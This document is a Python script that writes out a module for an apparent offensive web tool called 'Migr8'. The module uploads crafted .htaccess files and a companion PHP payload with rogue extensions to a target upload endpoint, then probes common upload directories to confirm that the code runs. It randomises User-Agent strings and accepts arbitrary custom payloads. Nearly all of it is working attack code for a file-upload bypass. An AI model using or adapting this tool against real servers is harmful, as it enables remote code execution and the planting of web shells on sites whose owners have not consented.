# Create htaccess_probe.py core module
htaccess_probe_code = '''"""
.htaccess Probe Module for Migr8 Framework
Upload crafted .htaccess files to whitelist rogue extensions and test execution
"""

import requests
import os
import time
from urllib.parse import urljoin
from ..utils.logger import logger
from ..utils.bypasses import USER_AGENTS, HTACCESS_TEMPLATES
import random

class HtaccessProbe:
    """Test .htaccess file upload and execution bypass techniques"""
    
    def __init__(self, timeout=30):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS)
        })
        self.test_extensions = ['.evil', '.rogue', '.bad', '.pwn']
    
    def test_htaccess_bypass(self, target_url, base_url, payload_file=None):
        """
        Test .htaccess bypass technique
        
        Args:
            target_url (str): Upload endpoint URL
            base_url (str): Base URL for testing execution
            payload_file (str): Optional custom payload file
            
        Returns:
            dict: .htaccess bypass test results
        """
        logger.info("Starting .htaccess bypass test")
        
        results = {
            'htaccess_uploads': [],
            'payload_uploads': [],
            'execution_tests': [],
            'successful_bypasses': []
        }
        
        # Test each .htaccess template
        for i, template in enumerate(HTACCESS_TEMPLATES):
            logger.info(f"Testing .htaccess template {i+1}/{len(HTACCESS_TEMPLATES)}")
            
            # Step 1: Upload .htaccess file
            htaccess_result = self._upload_htaccess(target_url, template, i)
            if htaccess_result:
                results['htaccess_uploads'].append(htaccess_result)
                
                if htaccess_result['success']:
                    # Step 2: Upload companion payload with rogue extension
                    payload_result = self._upload_companion_payload(target_url, payload_file, i)
                    if payload_result:
                        results['payload_uploads'].append(payload_result)
                        
                        if payload_result['success']:
                            # Step 3: Test execution
                            execution_result = self._test_execution(base_url, payload_result['filename'])
                            if execution_result:
                                results['execution_tests'].append(execution_result)
                                
                                if execution_result['executed']:
                                    bypass_info = {
                                        'template_index': i,
                                        'htaccess_template': template,
                                        'payload_filename': payload_result['filename'],
                                        'execution_url': execution_result['successful_url'],
                                        'method': 'htaccess_bypass'
                                    }
                                    results['successful_bypasses'].append(bypass_info)
                                    logger.success(f".htaccess bypass successful! Template {i+1}")
        
        # Summary
        bypass_count = len(results['successful_bypasses'])
        logger.info(f".htaccess bypass test complete: {bypass_count} successful bypasses")
        
        return results
    
    def _upload_htaccess(self, target_url, template, template_index):
        """Upload .htaccess file with specific template"""
        timestamp = str(int(time.time()))
        filename = f".htaccess_{timestamp}_{template_index}"
        
        logger.info(f"Uploading .htaccess file: {filename}")
        
        try:
            # Prepare .htaccess content
            htaccess_content = template.replace('\\n', '\\n')
            
            files = {
                'file': (filename, htaccess_content.encode(), 'text/plain')
            }
            
            data = {
                'submit': 'Upload',
                'action': 'upload'
            }
            
            response = self.session.post(
                target_url,
                files=files,
                data=data,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            result = {
                'filename': filename,
                'template_index': template_index,
                'template_content': template,
                'status_code': response.status_code,
                'response_length': len(response.content),
                'success': self._analyze_upload_success(response),
                'response_preview': response.text[:200]
            }
            
            if result['success']:
                logger.success(f".htaccess upload successful: {filename}")
            else:
                logger.error(f".htaccess upload failed: {filename}")
            
            return result
            
        except Exception as e:
            logger.error(f".htaccess upload failed: {str(e)}")
            return None
    
    def _upload_companion_payload(self, target_url, payload_file, template_index):
        """Upload companion payload with rogue extension"""
        timestamp = str(int(time.time()))
        rogue_extension = self.test_extensions[template_index % len(self.test_extensions)]
        filename = f"payload_{timestamp}{rogue_extension}"
        
        logger.info(f"Uploading companion payload: {filename}")
        
        try:
            # Determine payload content
            if payload_file and os.path.exists(payload_file):
                with open(payload_file, 'rb') as f:
                    payload_content = f.read()
            else:
                # Generate default PHP payload
                payload_content = self._generate_default_payload().encode()
            
            files = {
                'file': (filename, payload_content, 'text/plain')
            }
            
            data = {
                'submit': 'Upload',
                'action': 'upload'
            }
            
            response = self.session.post(
                target_url,
                files=files,
                data=data,
                timeout=self.timeout,
                allow_redirects=True
            )
            
            result = {
                'filename': filename,
                'extension': rogue_extension,
                'template_index': template_index,
                'status_code': response.status_code,
                'response_length': len(response.content),
                'success': self._analyze_upload_success(response),
                'response_preview': response.text[:200]
            }
            
            if result['success']:
                logger.success(f"Companion payload upload successful: {filename}")
            else:
                logger.error(f"Companion payload upload failed: {filename}")
            
            return result
            
        except Exception as e:
            logger.error(f"Companion payload upload failed: {str(e)}")
            return None
    
    def _test_execution(self, base_url, filename):
        """Test if uploaded payload executes via .htaccess bypass"""
        logger.info(f"Testing execution: {filename}")
        
        # Common upload paths to test
        test_paths = [
            '', 'uploads/', 'upload/', 'files/', 'file/', 'temp/', 'tmp/',
            'data/', 'media/', 'attachments/'
        ]
        
        for path in test_paths:
            test_url = urljoin(base_url.rstrip('/') + '/', path + filename)
            
            try:
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for execution
                if response.status_code == 200:
                    executed = self._check_payload_execution(response)
                    
                    if executed:
                        logger.success(f"Payload execution confirmed: {test_url}")
                        return {
                            'filename': filename,
                            'successful_url': test_url,
                            'executed': True,
                            'status_code': response.status_code,
                            'response_preview': response.text[:200]
                        }
                
                # Check for 404/400 status changes (indicates .htaccess working)
                elif response.status_code in [404, 400]:
                    logger.warning(f"Status code {response.status_code} for {test_url} - .htaccess may be active")
                
            except requests.exceptions.RequestException as e:
                logger.debug(f"Request failed for {test_url}: {str(e)}")
                continue
        
        logger.error(f"Payload execution failed: {filename}")
        return {
            'filename': filename,
            'executed': False,
            'tested_paths': test_paths
        }
    
    def test_htaccess_detection(self, base_url):
        """
        Test if .htaccess files are processed by the server
        
        Args:
            base_url (str): Base URL to test
            
        Returns:
            dict: .htaccess detection results
        """
        logger.info("Testing .htaccess processing capability")
        
        # Create test .htaccess with redirect rule
        test_htaccess = "Redirect 301 /migr8test.html http://example.com/"
        
        detection_results = {
            'htaccess_supported': False,
            'evidence': [],
            'test_details': []
        }
        
        # Test various paths where .htaccess might work
        test_locations = [
            'uploads/', 'upload/', 'files/', 'temp/', 'public/', ''
        ]
        
        for location in test_locations:
            test_url = urljoin(base_url.rstrip('/') + '/', location)
            
            # Check if we can determine .htaccess support indirectly
            try:
                # Test for Apache server (common .htaccess supporter)
                response = self.session.head(test_url, timeout=self.timeout)
                server_header = response.headers.get('server', '').lower()
                
                if 'apache' in server_header:
                    detection_results['htaccess_supported'] = True
                    detection_results['evidence'].append(f"Apache server detected: {server_header}")
                
                test_detail = {
                    'location': location,
                    'url': test_url,
                    'server': server_header,
                    'status_code': response.status_code
                }
                detection_results['test_details'].append(test_detail)
                
            except Exception as e:
                logger.debug(f"Detection test failed for {test_url}: {str(e)}")
                continue
        
        if detection_results['htaccess_supported']:
            logger.success(".htaccess support detected")
        else:
            logger.warning(".htaccess support uncertain")
        
        return detection_results
    
    def _generate_default_payload(self):
        """Generate default PHP payload for .htaccess bypass testing"""
        return """<?php
/*
 * Migr8 .htaccess Bypass Test Payload
 * Confirms successful execution via .htaccess bypass
 */

echo "<!-- Migr8 .htaccess Bypass Successful -->\\n";
echo "<h2>.htaccess Bypass Test Successful</h2>\\n";
echo "<p>Execution confirmed via .htaccess bypass technique</p>\\n";
echo "<p>Current Time: " . date('Y-m-d H:i:s') . "</p>\\n";
echo "<p>Server: " . $_SERVER['SERVER_SOFTWARE'] . "</p>\\n";
echo "<p>PHP Version: " . phpversion() . "</p>\\n";
echo "<p>File: " . __FILE__ . "</p>\\n";
echo "<p>Directory: " . __DIR__ . "</p>\\n";
echo "<!-- End Migr8 .htaccess Bypass Test -->\\n";
?>"""
    
    def _analyze_upload_success(self, response):
        """Analyze response to determine if upload was successful"""
        status_code = response.status_code
        content = response.text.lower()
        
        # Success indicators
        success_indicators = [
            'upload successful', 'file uploaded', 'upload complete',
            'successfully uploaded', 'file saved'
        ]
        
        # .htaccess specific error indicators
        htaccess_errors = [
            'htaccess not allowed', 'system files blocked', 'dangerous file',
            'configuration files not permitted'
        ]
        
        if status_code in [200, 201, 302]:
            has_success = any(indicator in content for indicator in success_indicators)
            has_htaccess_error = any(error in content for error in htaccess_errors)
            
            if has_success and not has_htaccess_error:
                return True
            elif not has_htaccess_error and 'error' not in content:
                return True
        
        return False
    
    def _check_payload_execution(self, response):
        """Check if payload executed successfully"""
        if response.status_code != 200:
            return False
        
        content = response.text.lower()
        
        # Execution indicators
        execution_indicators = [
            'migr8 .htaccess bypass successful',
            '.htaccess bypass test successful',
            'execution confirmed via .htaccess bypass',
            'current time:', 'php version:', 'server:'
        ]
        
        return any(indicator in content for indicator in execution_indicators)
    
    def comprehensive_htaccess_test(self, target_url, base_url):
        """
        Perform comprehensive .htaccess bypass testing
        
        Args:
            target_url (str): Upload endpoint
            base_url (str): Base URL for testing
            
        Returns:
            dict: Comprehensive test results
        """
        logger.info("Starting comprehensive .htaccess bypass test")
        
        comprehensive_results = {
            'detection_test': self.test_htaccess_detection(base_url),
            'bypass_test': self.test_htaccess_bypass(target_url, base_url),
            'summary': {}
        }
        
        # Generate summary
        bypass_count = len(comprehensive_results['bypass_test']['successful_bypasses'])
        htaccess_supported = comprehensive_results['detection_test']['htaccess_supported']
        
        comprehensive_results['summary'] = {
            'htaccess_supported': htaccess_supported,
            'successful_bypasses': bypass_count,
            'total_templates_tested': len(HTACCESS_TEMPLATES),
            'success_rate': f"{bypass_count}/{len(HTACCESS_TEMPLATES)}"
        }
        
        logger.info(f"Comprehensive .htaccess test complete: {bypass_count} bypasses successful")
        
        return comprehensive_results
    
    def close(self):
        """Close the session"""
        self.session.close()
'''

with open("migr8/core/htaccess_probe.py", 'w') as f:
    f.write(htaccess_probe_code)
print("Created: migr8/core/htaccess_probe.py")